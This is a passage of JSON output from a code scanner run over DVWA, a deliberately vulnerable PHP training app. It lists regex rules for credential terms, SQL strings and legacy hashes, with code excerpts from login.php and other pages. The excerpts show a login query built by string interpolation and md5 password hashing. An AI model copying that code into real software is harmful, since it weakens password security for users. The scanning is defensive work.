        "sample": "password",
        "excerpt": "\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t$query = (&quot;SELECT table_schema, table_name, create_time\n",
        "startLocationLine": 24,
        "startLocationColumn": 19,
        "endLocationLine": 24,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t}\n\n\t$query  = &quot;SELECT * FROM `users` WHERE user=&#39;$user&#39; AND password=&#39;$pass&#39;;&quot;;\n\t$result = @mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;.&lt;br /&gt;Try &lt;a href=&quot;setup.php&quot;&gt;installing again&lt;/a&gt;.&lt;/pre&gt;&#39; );\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {    // Login Successful...\n\t\tdvwaMessagePush( &quot;You have logged in as &#39;{$user}&#39;&quot; );\n\t\tdvwaLogin( $user );\n\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;index.php&#39; );\n",
        "startLocationLine": 39,
        "startLocationColumn": 58,
        "endLocationLine": 39,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\n\t&lt;fieldset&gt;\n\n\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n",
        "startLocationLine": 96,
        "startLocationColumn": 24,
        "endLocationLine": 96,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\n\t&lt;fieldset&gt;\n\n\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n",
        "startLocationLine": 96,
        "startLocationColumn": 102,
        "endLocationLine": 96,
        "endLocationColumn": 110
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 99,
        "startLocationColumn": 24,
        "endLocationLine": 99,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 99,
        "startLocationColumn": 55,
        "endLocationLine": 99,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 99,
        "startLocationColumn": 127,
        "endLocationLine": 99,
        "endLocationColumn": 135
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;login.php&#39; );\n\n\t$user = $_POST[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n",
        "startLocationLine": 20,
        "startLocationColumn": 19,
        "endLocationLine": 20,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
        "excerpt": "\n\t&lt;fieldset&gt;\n\n\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n",
        "startLocationLine": 96,
        "startLocationColumn": 24,
        "endLocationLine": 96,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\n\t&lt;fieldset&gt;\n\n\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n",
        "startLocationLine": 96,
        "startLocationColumn": 102,
        "endLocationLine": 96,
        "endLocationColumn": 110
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t$query = (&quot;SELECT table_schema, table_name, create_time\n",
        "startLocationLine": 24,
        "startLocationColumn": 19,
        "endLocationLine": 24,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t}\n\n\t$query  = &quot;SELECT * FROM `users` WHERE user=&#39;$user&#39; AND password=&#39;$pass&#39;;&quot;;\n\t$result = @mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;.&lt;br /&gt;Try &lt;a href=&quot;setup.php&quot;&gt;installing again&lt;/a&gt;.&lt;/pre&gt;&#39; );\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {    // Login Successful...\n\t\tdvwaMessagePush( &quot;You have logged in as &#39;{$user}&#39;&quot; );\n\t\tdvwaLogin( $user );\n\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;index.php&#39; );\n",
        "startLocationLine": 39,
        "startLocationColumn": 58,
        "endLocationLine": 39,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 99,
        "startLocationColumn": 24,
        "endLocationLine": 99,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 99,
        "startLocationColumn": 55,
        "endLocationLine": 99,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n\n\t\t\t&lt;label for=\\&quot;pass\\&quot;&gt;Password&lt;/label&gt; &lt;input type=\\&quot;password\\&quot; class=\\&quot;loginInput\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; size=\\&quot;20\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 99,
        "startLocationColumn": 127,
        "endLocationLine": 99,
        "endLocationColumn": 135
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT table_schema, table_name, create_time",
        "excerpt": "\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t$query = (&quot;SELECT table_schema, table_name, create_time\n\t\t\t\tFROM information_schema.tables\n\t\t\t\tWHERE table_schema=&#39;{$_DVWA[&#39;db_database&#39;]}&#39; AND table_name=&#39;users&#39;\n\t\t\t\tLIMIT 1&quot;);\n\t$result = @mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query );\n\tif( mysqli_num_rows( $result ) != 1 ) {\n",
        "startLocationLine": 29,
        "startLocationColumn": 12,
        "endLocationLine": 29,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user=&#39;$user&#39; AND password=&#39;$pass&#39;;&quot;;",
        "excerpt": "\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t}\n\n\t$query  = &quot;SELECT * FROM `users` WHERE user=&#39;$user&#39; AND password=&#39;$pass&#39;;&quot;;\n\t$result = @mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;.&lt;br /&gt;Try &lt;a href=&quot;setup.php&quot;&gt;installing again&lt;/a&gt;.&lt;/pre&gt;&#39; );\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {    // Login Successful...\n\t\tdvwaMessagePush( &quot;You have logged in as &#39;{$user}&#39;&quot; );\n\t\tdvwaLogin( $user );\n\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;index.php&#39; );\n",
        "startLocationLine": 39,
        "startLocationColumn": 12,
        "endLocationLine": 39,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t$query = (&quot;SELECT table_schema, table_name, create_time\n\t\t\t\tFROM information_schema.tables\n\t\t\t\tWHERE table_schema=&#39;{$_DVWA[&#39;db_database&#39;]}&#39; AND table_name=&#39;users&#39;\n\t\t\t\tLIMIT 1&quot;);\n",
        "startLocationLine": 27,
        "startLocationColumn": 10,
        "endLocationLine": 27,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_source.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] .= &#39;Source&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\n$id       = $_GET[ &#39;id&#39; ];\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_source_all.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;Source&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\n$id = $_GET[ &#39;id&#39; ];\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;Help&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\n$id       = $_GET[ &#39;id&#39; ];\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/cookie-input.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;Blind SQL Injection Cookie Input&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\nif( isset( $_POST[ &#39;id&#39; ] ) ) {\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
